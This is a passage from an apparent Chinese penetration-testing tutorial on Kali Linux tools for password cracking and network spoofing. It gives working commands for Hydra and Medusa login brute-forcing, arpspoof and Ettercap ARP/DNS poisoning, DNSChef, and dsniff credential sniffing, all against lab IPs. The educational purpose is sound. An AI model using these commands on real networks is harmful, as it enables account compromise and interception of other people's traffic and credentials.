+<p>上述指令将会在屏幕上显示简单的使用说明及相关范例。<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#ophcrack</span></span><br></pre></td></tr></table></figure></p>
+<p>上述指令将会启动Ophcrack    GUI（图形化界面）</p>
+<ul>
+<li>Crunch</li>
+</ul>
+<p>如果要创建由字母组成的密码长度在5个字符以内密码字典，并指定密码字典的文件名为 5chars.txt，我们可使用下述指令。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#crunch     <span class="number">1</span>     <span class="number">5</span>     –o    <span class="number">5</span>chars.txt</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/posts/201905120856356.png" alt="img"></p>
+<p><img src="/img/posts/20190512085642278.png" alt="img"></p>
+<p><img src="/img/posts/20190512085642399.png" alt="img"></p>
+<p>这个文件的内容表明，上述指令创建了从a到zzzzz的各种字符串，并将其组织为密码字典</p>
+<p>接下来，我们要创建由小写字母和数字组成的密码长度在        4个字符以内的密码字典，并指定 字典文件的文件名为wordlist.lst。</p>
+<p>根据以上需求，我们需要使用下述指令。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#crunch</span>     <span class="number">1</span>        <span class="number">4</span>     -f    /usr/share/crunch/charset<span class="selector-class">.lst</span>  lalpha-numeric</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/posts/2019051208563958.png" alt="img"></p>
+<p><img src="/img/posts/20190512085637239.png" alt="img"></p>
+<h2 id="在线攻击工具"><a href="#在线攻击工具" class="headerlink" title="在线攻击工具"></a>在线攻击工具</h2><p>所谓在线破解，意味着这类工具在与被测主机建立连接之后才能破解密码。</p>
+<p>本节将要介绍的工具可分为以下几类：</p>
+<ol>
+<li><p>制作密码字典；</p>
+</li>
+<li><p>搜索密码的哈希值；</p>
+</li>
+<li><p>在线密码破解工具。</p>
+</li>
+</ol>
+<h3 id="在线密码破解工具"><a href="#在线密码破解工具" class="headerlink" title="在线密码破解工具"></a>在线密码破解工具</h3><p>首先会讲解两款根据被测网站信息制作密码字典的工具，然后会介绍几款在线破解密码的工具。</p>
+<p>在线密码破解工具会采取常规用户登录的方式，以用户名和密码登录远程主机的网络服务。 它会不断尝试各种用户名和密码，直到发现正确的账户信息为止。</p>
+<p>这类工具存在暴露的风险。因为测试主机会直接连接到被测主机，所以可能会被对方发现甚 至会被屏蔽。因为这些工具使用的是标准登录过程，所以在破解效率方面比离线攻击软件的 效率更高。</p>
+<p>虽然在线攻击工具速度不快，也可能触发帐户锁定机制，但是对于     SSH、Telnet 和FTP这类 服务来说，在线攻击是密码破解的唯一方式。在进行在线的密码攻击时，务必加倍小心；尤 其是在攻击 Active Directory（AD）服务器的账户时，暴力破解可能会锁定所有的域账户。要 避免发生锁定账户的情况，不仅要事先查看密码和用户锁定策略，在测试密码时最好还要使 用同一个密码对所有用户名进行测试（轮换用户名，而不是轮换密码）。</p>
+<p>​      1．CeWL</p>
+<p>CeWL（Custom   Word  List）（<a href="http://www.digininja.org/projects/cewl.php）" target="_blank" rel="noopener">http://www.digininja.org/projects/cewl.php）</a>  是一款以爬虫模 式在指定URL上收集单词的工具。把它收集到的单词纳入密码字典，可提高密码破解工具 （例如John    the      Ripper）的命中率。</p>
+<p>CeWL程序有很多选项，其中较为常用的如下所示。</p>
+<ul>
+<li><p>–depth  N   或-d    N：提取深度，分析  N   级链接以内的网页内容；提取深度的默认值是2。</p>
+</li>
+<li><p>–min_word_length    N   或-m  N：单词的最小长度，少于N           个字符的单词不会被收录；单词最 小长度的默认值是3。 -  –verbose    或-v：详细提示模式。</p>
+</li>
+<li><p>–write    或-w：设定输出文件的文件名。</p>
+</li>
+</ul>
+<p>结合上述选项，我们使用下述指令从目标网站收集单词。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#cewl</span>    -w     target<span class="selector-class">.txt</span>        http:<span class="comment">//www.target.com</span></span><br></pre></td></tr></table></figure></p>
+<p>稍等片刻之后，程序会把收集到的单词保存为文件target.txt。在Kali系统里，这个文件位于目 录/usr/share/cewl</p>
+<p>2．Hydra</p>
+<p>Hydra是一款猜测并破解用户名和密码的工具。它支持多种网络协议，可破解HTTP、FTP、 POP3和SMB等协议的密码。它会使用字典并行穷举网络服务的用户名和密码。默认情况下， 它向目标主机发起16个并行连接同时进行多组测试。</p>
+<p>如需启动Hydra程序，可在终端中使用下述指令。<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#hydra</span></span><br></pre></td></tr></table></figure></p>
+<p>本例将演示使用hydra程序破解192.168.56.101的VNC服务器的密码。如果密码字典的文件名 是password.lst，我们可使用下述指令。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#hydra</span>      <span class="selector-tag">-P</span>      <span class="selector-tag">password</span><span class="selector-class">.lst</span>   192<span class="selector-class">.168</span><span class="selector-class">.56</span><span class="selector-class">.101</span>      <span class="selector-tag">vnc</span></span><br></pre></td></tr></table></figure></p>
+<p>下一步工作就是验证Hydra破解的密码。我们可直接运行vncviewer程序，使用这些密码连接 到远程主机的VNC服务器。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#vncviewer</span>  192<span class="selector-class">.168</span><span class="selector-class">.56</span><span class="selector-class">.101</span></span><br></pre></td></tr></table></figure></p>
+<p>3．Medusa</p>
+<p>Medusa是另外一款在线破解网络服务密码的程序。它具有速度快、并发性能强和模板化的特 点。现在，它能够通过相应模板破解CVS、FTP、HTTP、IMAP、MS-SQL、MySQL、 NCP（NetWare）、PcAnywhere、POP3、PostgreSQL、rexec、Rlogin、rsh、SMB、 SMTP（VRFY）、SNMP、SSHv2、SVN、Telnet、VmAuthd、VNC协议，另有一个通用处 理模板。</p>
+<p>在实际的渗透测试工作中，可同时使用这两款工具、尽可能获取被测主机的各种信息。</p>
+<p>如需启动Medusa工具，可在终端中使用下述指令。<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#medusa</span></span><br></pre></td></tr></table></figure></p>
+<p>Medusa程序有很多选项，其中常用的一些选项如下所示。</p>
+<ul>
+<li><p>-u          或-U[FILE]：指定用户名或用户名字典。</p>
+</li>
+<li><p>-h          或-H[FILE]：指定主机名或主机名字典。</p>
+</li>
+<li><p>-p          或-P[FILE]：指定密码或密码字典。 - -M：配置测试所用的模板的名称。亦可通过-d 选项搜索模板。</p>
+</li>
+<li><p>-O：设置输出文件的文件名。</p>
+</li>
+<li><p>-V：设置提示信息的详细程度。如果使用了-v     4    选项，将只能看到成功破解的登录凭据</p>
+</li>
+</ul>
+<p>再用Medusa对vnc作一次相同的破解试验<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#medusa</span>      <span class="selector-tag">-u</span> <span class="selector-tag">root</span>      <span class="selector-tag">-P</span> <span class="selector-tag">password</span><span class="selector-class">.lst</span>  <span class="selector-tag">-h</span> 192<span class="selector-class">.168</span><span class="selector-class">.56</span><span class="selector-class">.101</span>     <span class="selector-tag">-M</span>      <span class="selector-tag">vnc</span>     <span class="selector-tag">-v</span>              4</span><br></pre></td></tr></table></figure></p>
+<h3 id="网络欺骗工具"><a href="#网络欺骗工具" class="headerlink" title="网络欺骗工具"></a>网络欺骗工具</h3><p>前面介绍了多款破解密码的工具。本节将探索通过网络欺骗的手段提升权限的各种方法。网络欺骗（network   spoofing）泛指修改网络数据的各种手段。例如，伪造MAC地址、伪造 IP地址等的数据，都属于网络欺骗的范畴。网络欺骗旨在于获取网络上两个会话主机的通信数据。</p>
+<ol>
+<li>DNSChef</li>
+</ol>
+<p>DNSChef（<a href="http://thesprawl.org/projects/dnschef/）" target="_blank" rel="noopener">http://thesprawl.org/projects/dnschef/）</a>  是一款DNS代理工具。它可替DNS服务器 对被测主机进行DNS回复，把域名解析为攻击者管控的IP，从而让攻击者的主机扮演真正的 服务器的角色。DNSChef的这种功能可用来分析甚至控制客户主机的网络流量。<br>在使用DNSChef之前，需要对被测主机进行调整，指定DNSChef的主机为被测主机的DNS 服务器。</p>
+<ul>
+<li><p>如果被测主机安装的是Linux    系统，那么应当修改/etc/resolv.conf   文件。</p>
+</li>
+<li><p>如果被测主机安装的是  Windows，可通过控制面板的网络连接选项进行相应的设置。在没有权限更改被测主机     DNS        服务器设置的情况下，就需要使用其他手段（例如ARP欺骗 并搭设一个伪DHCP服务器等）劫持被测主机的DNS请求。</p>
+</li>
+</ul>
+<p>本例涉及2台主机，一台是运行DNSChef的主机，其IP为192.168.2.21；另一台是被测（受害人的）主机，其IP是192.168.2.22。简便起见，我们用Metasploitable的虚拟机充当被测主机。</p>
+<p>首先，我们要对DNSChef进行设置。</p>
+<p>1)．设置为DNS代理</p>
+<p>第一步是把DNSChef设置为DNS代理服务器。我们要在  DNSChef的主机上运行下述指令。<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#dnschef</span></span><br></pre></td></tr></table></figure></p>
+<p>而后调整这台主机的DNS设置，使之使用本机（localhost）的DNS服务器。 然后使用下述命令查询google.com的DNS记录。<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#host -t    A    google.com</span></span><br></pre></td></tr></table></figure></p>
+<p>上述指令向DNSChef发起DNS查询，这种设置将DNSChef调整为DNS代理服务器。它将所有DNS解析请求转发到上游解析服务器。本例中，它的上游DNS服务器是8.8.8.8。</p>
+<p>2)．伪造域名记录</p>
+<p>现在，我们要伪造      google.com      有关的       DNS      响应。和前一个例子里的情况一样，首先要修 改/etc/resolv.conf文件，令被测主机使用DNSChef作为其DNS服务器。</p>
+<p>接下来在DNSChef所在的主机上使用下述指令。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#dnschef     --fakeip=<span class="number">192.168</span><span class="number">.2</span><span class="number">.21</span>    -fakedomains      google.com --interface    <span class="number">192.168</span><span class="number">.2</span><span class="number">.21</span>     -q</span><br></pre></td></tr></table></figure></p>
+<p>而后我们在被测主机查询google.com的IP地址。<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$         host -t      <span class="keyword">A</span>    google.com</span><br></pre></td></tr></table></figure></p>
+<ol start="2">
+<li>arpspoof</li>
+</ol>
+<p>arpspoof是一款在交换网络中辅助进行网络监听的实用工具。前文提过，在使用交换机进行 数据交换的网络环境里很难进行网络监听，但arpspoof可以辅助我们完成这项任务。</p>
+<p>arpspoof用于伪造网络中两台设备的ARP通信。</p>
+<p>常规情况下，当主机A要和主机B（网关）进行通信的时候，主机A会广播ARP请求以获取主 机B    的MAC      地址。此后，主机B 将会回应这个ARP  请求，在ARP Reply   数据包里声明自己的 MAC地址；与此同时，主机B也会将ARP广播中主机A的MAC地址记录下来。此后，主机A和 主机B才能开始通信</p>
+<p>如果攻击者C想要监听主机A和主机B之间的网络流量，则可以向主机A发送ARP回复，告诉它 主机B使用的是主机C的MAC地址（33.33.33.33.33.33）；而后它还要通告主机B，“主机A的 MAC地址是33.33.33.33.33.33”</p>
+<p>在ARP欺骗生效之后，主机A和主机B之间的所有网络数据包都会通过主机C转发。</p>
+<p>在使用arpspoof之前，需要在Kali  Linux（运行ARPspoof）的主机上启用IP       转发功能。这就需 要以root用户的身份执行下述指令。<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo  1   &gt;        /proc/sys/net/ipv4/ip_forward</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#arpspoof</span></span><br></pre></td></tr></table></figure></p>
+<p>本例的试验环境的具体情况如下所示。</p>
+<p>网关的配置信息如下。</p>
+<ul>
+<li><p>MAC  地址：00-50-56-C0-00-08 -  IP   地址：192.168.65.1</p>
+</li>
+<li><p>子网掩码：255.255.255.0</p>
+</li>
+</ul>
+<p>被测主机的配置如下。</p>
+<ul>
+<li><p>MAC  地址：00-0C-29-35-C9-CD</p>
+</li>
+<li><p>IP 地址：192.168.65.129 - 子网掩码：255.255.255.0</p>
+</li>
+</ul>
+<p>测试主机的配置如下。</p>
+<ul>
+<li><p>MAC  地址：00: 0C: 29: 09: 22: 31</p>
+</li>
+<li><p>IP 地址：192.168.65.130</p>
+</li>
+<li><p>子网掩码：255.255.255.0 在启动程序以前，被测主机的ARP缓存如下所示。</p>
+</li>
+</ul>
+<p>Interface:     192.168.65.129     —   0x30002</p>
+<p>Internet Address      Physical      Address      Type</p>
+<p>192.168.65.1　　00-50-56-c0-00-08　dynamic</p>
+<p>通过以下命令，对被测主机实施ARP欺骗。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># <span class="selector-tag">arpspoof</span> <span class="selector-tag">-t</span>   192<span class="selector-class">.168</span><span class="selector-class">.65</span><span class="selector-class">.129</span>  192<span class="selector-class">.168</span><span class="selector-class">.65</span><span class="selector-class">.1</span></span><br></pre></td></tr></table></figure></p>
+<p>在被测主机上稍等片刻，然后用      ping      命令测试网关的连接情况。被测主机的      ARP      缓存很快 就就会改变为下述内容。</p>
+<p>Interface:     192.168.65.129     —   0x30002</p>
+<p>Internet Address      Physical      Address      Type</p>
+<p>192.168.65.1　　00-0C-29-09-22-31　dynamic</p>
+<p>上述信息表明，在被测主机的ARP缓存里，网关的MAC地址由00-50-56-c0-00-08改变为000C-29-09-22-31。新的MAC地址是测试主机的MAC地址。从中可以看出，网关对应MAC地址 已经变成攻击者机器的MAC地址。</p>
+<ol start="3">
+<li>Ettercap</li>
+</ol>
+<p>Ettercap（<a href="http://www.ettercap-project.org/）" target="_blank" rel="noopener">http://www.ettercap-project.org/）</a>  是一款在LAN中进行中间人攻击的工具集。它通 过ARP攻击充当网络通信的中间人。一且ARP协议的攻击奏效，它就能够：</p>
+<ul>
+<li><p>修改数据连接；</p>
+</li>
+<li><p>截获FTP、HTTP、POP 和SSH1     等协议的密码；</p>
+</li>
+<li><p>通过伪造SSL      证书的手段劫持被测主机的HTTPS 会话。</p>
+</li>
+</ul>
+<p>ARP协议（地址解析协议）用来把IP地址解析为物理地址（MAC地址）。当某个网络设备需 要与其他网络资源通信时，它会通过ARP广播查询目标设备的MAC地址，目标设备也会通过 ARP协议的数据包回复自己的MAC地址。此后，通信双方都会将IP和MAC的对应信息保存到 自己的ARP缓存中，以节省后续通信的查询时间。 在某台主机要进行通信时，它首先会查询对方IP地址的MAC地址。此时，攻击人员可将自己 主机回复给查询MAC地址的主机，以进行中间人攻击。这种攻击叫做ARP毒化（污染）攻击 和ARP欺骗。只有当攻击主机和被测主机处于同一网段的时候，这种攻击才会有效。</p>
+<p>Kali     Linux 提供的Ettercap    工具可以实施这种攻击。Ettercap  有三种操作模式：文本模式、仿图形（curses，以字符模拟图形界面）模式和GTK界面的图形模式。</p>
+<p>若要以文本模式启动Ettercap程序，可在终端中使用下述指令。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#ettercap</span>     -T</span><br></pre></td></tr></table></figure></p>
+<p>若要以仿图形模式启动它，可在终端中使用下述指令。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#ettercap</span>    -C</span><br></pre></td></tr></table></figure></p>
+<p>若要进入Ettercap的图形模式，可在终端中使用下述指令。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#ettercap</span>    -G</span><br></pre></td></tr></table></figure></p>
+<p>本例将使用Ettercap程序进行DNS欺骗攻击。各主机采用了前一个例子的配置方法。此外，本例要使用额外的两台主机：IP为192.16S.2.1的DNS服务器；一台诱导被测主机连接的IP地址 为192.168.2.22的Web服务器。攻击人员测试主机的IP地址为192.168.2.21。</p>
+<p>1).        进入Ettercap      的图形模式。 </p>
+<p>2).        在菜单里依次选中Sniff      |     Unified       sniffing，选则相应的网卡</p>
+<p>3).        在菜单中选择Hosts      |     Scan     for hosts，扫描网络中的主机。</p>
+<p>4).        在菜单中选择Hosts      |     Hosts   list，査看当前联网的主机。 </p>
+<p>5).        指定要欺骗的主机。本例中，我们选择192.168.2.1（DNS 服务器）作为第一目标。在主机 列表中，选中这个IP，然后点击Add                     to Target  1。接下来，选中192.168.2.22并把它添加为第 二目标Add        to      Target  22</p>
+<p>6).        在菜单里依次选中Mitm|  Arp       poisoning，以启动ARP  攻击。现在DNS    服务器和被测的MAC 地址均认为对方的IP   使用的是攻击人员主机的MAC   地址。</p>
+<p>7).        调整配置文件/usr/share/ettercap/etter.dns，将诱导服务器的                     IP 地址绑定在需要欺骗（拦 截）的域名上。</p>
+<p>google.com　　A　　192.168.2.21</p>
+<p>*.google.com　A　　192.168.2.21</p>
+<p><a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a>　PTR　192.168.2.21</p>
+<p>这将把被测主机与google.com  之间的全部通信诱导到攻击人员部署的Web服务器上。</p>
+<p>8).        在菜单里依次选中  Plugins |     Manage      the plugins，然后双击（激活）dns_spoof插件。 </p>
+<p>9).        最后，我们在被测主机上打开浏览器，访问google.com  。</p>
+<p>上述情况表明，DNS欺骗已经奏效。被测主机没有看到真正的Google网站，它的浏览器访问 的是攻击人员部署的Web服务器。</p>
+<p>10).      如需停止攻击，可在菜单中依次选中Mitm |     Stop     mitm                     attack(s)。 即使觉得图形界面的操作过于繁琐，您也不必担心。在Ettercap的文本模式里，这些操作要简 洁得多。</p>
+<p>在文本模式里，以下指令就可完成刚才的前8步操作（第7步除外）。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#ettercap     -i  eth0   -T       -q -P       dns_spoof  -M  ARP /<span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span>/  /<span class="number">192.168</span><span class="number">.2</span><span class="number">.22</span>/</span><br></pre></td></tr></table></figure></p>
+<p>在文本模式 里，按Q键就可退出程序。</p>
+<h3 id="网络嗅探器"><a href="#网络嗅探器" class="headerlink" title="网络嗅探器"></a>网络嗅探器</h3><p>网络嗅探器器是监视网络数据的软件程序或硬件设备。人们往往利用它复制网络数据的功能 来检测网络数据。借助这类工具，您可以看到网络中正在传输的信息。</p>
+<p>不久之前，网络嗅探器只是网络工程师用来解决网络问题的工具。但是，它确实可以用来作恶。如果网络数据以明文传输，且计算机之间通过集线器交换数据，那么网络里的通信信 息，例如用户名、密码、邮件内容等，将很容易被他人捕获。幸运的是，如果使用交换机组 网，那么捕获数据的难度会高一些，但是他人仍然能够捕获信息。</p>
+<p>多数情况下，需要在嗅探数据以前进行网络欺骗攻击，因为它通常是成功施行网络嗅探的前提。</p>
+<ol>
+<li>Dsniff</li>
+</ol>
+<p>Dsniff 能够在网络中捕获密码。目前，它可从以下协议中捕获密码：FTP、Telnet、SMTP、 HTTP、POP、poppass、NNTP、IMAP、SNMP、LDAP、Rlogin、RIP、OSPF、PPTP MS-CHAP、NFS、VRRP、YP/NIS、SOCKS、X11、CVS、IRC、AIM、ICQ、      Napster、 PostgreSQL、Meeting     Maker、Citrix  ICA、Symantec  pcAnywhere、NAI      Sniffer、Microsoft SMB、Oracle SQL*Net、Sybase      以及Microsoft      SQL。</p>
+<p>如需启动dsniff程序，可在终端中使用下述指令。<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># dsniff  -h</span></span><br></pre></td></tr></table></figure></p>
+<p>上述指令将会在屏幕上显示程序的使用说明。我们将使用它捕获FTP密码。在本例的演示 中，FTP客户端的IP是192.168.2.20，服务器IP则是192.168.2.22，这两台主机通过集线器连 接。攻击人员的主机IP为192.168.2.21。</p>
+<p>在攻击人员的测试主机上执行下述指令。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#dsniff</span>      -<span class="selector-tag">i</span>         eth0 -m</span><br></pre></td></tr></table></figure></p>
+<p>其中，选项-i      eth0 将使Dsniff      程序监听eth0      网卡。而选项-m                 则用于启用程序的自动协议检测功能。</p>
+<p>然后，在装有FTP客户端程序的主机上，使用客户端程序登录FTP服务器。 </p>
+<p>dsniff的运行结果如下。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">dsniff</span>:     listening     on  eth0</span><br><span class="line"></span><br><span class="line">20/08/13     18:54:53    tcp 192.168.2.20.36761    -&gt;   192.168.2.22.21                     (ftp)</span><br><span class="line"></span><br><span class="line">USER  user</span><br><span class="line"></span><br><span class="line">PASS  user01</span><br></pre></td></tr></table></figure></p>
+<p>从中可以看到，dsniff捕获了客户端登录FTP服务器时所用的用户名和密码。</p>
+<ol start="2">
+<li>tcpdump</li>
+</ol>
+<p>tcpdump程序是一款网络嗅探器，它可以捕获符合条件表达式的网络数据包。在没有指定条件 表达式的情况下，它会显示所有网络数据包。而在指定条件表达式的情况下，它只会捕获符 合条件表达式的数据包。</p>
+<p>tcpdump还可以将网络数据包存储为文件，或从文件中读取网络数据。</p>
+<p>如需启动tcpdump程序，可在终端中执行下面这类指令。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#tcpdump</span> –<span class="selector-tag">i</span>    eth0   –s <span class="number">96</span></span><br></pre></td></tr></table></figure></p>
+<p>这个命令将监听eth0 网卡（-i    eth0），捕获大小为96   字节（-s                     96）的数据包。</p>
+<p>现在尝试嗅探从IP地址10.0.2.15到10.0.2.100的ICMP封包，这里设置嗅探eth0    接口（-i eth0），不需要把地址转换成主机名（-n），不需要打印时间戳（-t），用十六进制格式和 ASCII格式打印封包头和数据（-X）。在主机10.0.2.15处输入：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#tcpdump</span>    <span class="selector-tag">-n</span> <span class="selector-tag">-t</span>       <span class="selector-tag">-X</span>   <span class="selector-tag">-I</span>        <span class="selector-tag">eth0</span>    –<span class="selector-tag">s</span> 64  <span class="selector-tag">icmp</span>        <span class="selector-tag">and</span>    <span class="selector-tag">src</span> 192<span class="selector-class">.168</span><span class="selector-class">.56</span><span class="selector-class">.102</span>   <span class="selector-tag">and</span>         <span class="selector-tag">dst</span>  192<span class="selector-class">.168</span><span class="selector-class">.56</span><span class="selector-class">.101</span></span><br></pre></td></tr></table></figure></p>
+<p>因为指定了条件表达式，tcpdump程序只会显示符合条件表达式的网络数据包。在上述指令中，我们限定程序只显示由IP为192.168.56.102的主机向IP为192.168.56.101的主机发送的 ICMP数据包。</p>
+<ol start="3">
+<li>wireshark</li>
+</ol>
+<p>网络分析程序</p>
+<h1 id="四-社会工程学"><a href="#四-社会工程学" class="headerlink" title="四. 社会工程学"></a>四. 社会工程学</h1><p>这一部分我们就不再多做解释了</p>
+<p>社会工程学中的DNS欺骗、ARP欺骗、网络嗅探等在之前就已经介绍过了，这里不再重复。</p>
+
+    </div>
+    
+    <div class="post-footer">
+        <div>
+            
+                转载声明：商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="/" target="_blank">Ljjyy.com</a>
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+
+<div class="article-nav prev-next-wrap clearfix">
+    
+        <a href="/archives/2019/01/100157.html" class="pre-post btn btn-default" title='Kali linux渗透测试之 七.维持访问'>
+            <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+            <span class="hidden-xs">Kali linux渗透测试之 七.维持访问</span>
+        </a>
+    
+    
+        <a href="/archives/2019/01/100155.html" class="next-post btn btn-default" title='Kali linux渗透测试之 五.渗透攻击'>
+            <span class="hidden-lg">下一篇</span>
+            <span class="hidden-xs">Kali linux渗透测试之 五.渗透攻击</span><i class="fa fa-angle-right fa-fw"></i>
+        </a>
+    
+</div>
+
+
+    <div id="comments">
+        
+	
+    <div id="vcomments" class="valine"></div>
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="/assets/valine.min.js"></script>
+
+    <script>
+        new Valine({
+            av: AV,
+            el: '#vcomments',
+            appId: '5MzTXYXkt03k101j0PmSDN34-gzGzoHsz',
+            appKey: 'iwjYgwno6qj3wtDVVSbe8nYQ',
+            placeholder: '说点什么吧',
+            notify: false,
+            verify: true,
+            avatar: 'mm',
+            meta: 'nick,mail'.split(','),
+            pageSize: '10',
+            path: window.location.pathname,
+            lang: 'zh-CN'.toLowerCase()
+        })
+    </script>
+
+
+    </div>
+
+
+
+
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">文章目录</h3>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#一-权限提升的方式"><span class="toc-text">一. 权限提升的方式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#二-利用本地漏洞"><span class="toc-text">二. 利用本地漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#三-密码攻击"><span class="toc-text">三. 密码攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击方式"><span class="toc-text">攻击方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#离线攻击工具"><span class="toc-text">离线攻击工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#在线攻击工具"><span class="toc-text">在线攻击工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#在线密码破解工具"><span class="toc-text">在线密码破解工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网络欺骗工具"><span class="toc-text">网络欺骗工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网络嗅探器"><span class="toc-text">网络嗅探器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#四-社会工程学"><span class="toc-text">四. 社会工程学</span></a></li></ol>
+        
+    </div>
+</aside>
+
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+
+<a id="back-to-top" class="icon-btn hide">
+	<i class="fa fa-chevron-up"></i>
+</a>
+
+
+
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+</div>
+
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright &copy; 2019-2023&emsp;<a href="/" class="copyright-links" target="_blank" rel="nofollow">Ljjyy.com</a>
+                </span> |
+                <span>
+                    <a href="/about/" class="copyright-links" target="_blank" rel="nofollow">关于我们</a>
+                </span> |                
+                <span>
+                    <a href="/sitemap.xml" class="copyright-links" target="_blank" rel="nofollow">网站地图</a>
+                </span> |
+                <span>
+                    <a href="/archives/" class="copyright-links" target="_blank" rel="nofollow">时间轴</a>
+                </span>              
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+<script src="/js/app.js?rev=@@hash"></script>
+
+</body>
+</html>
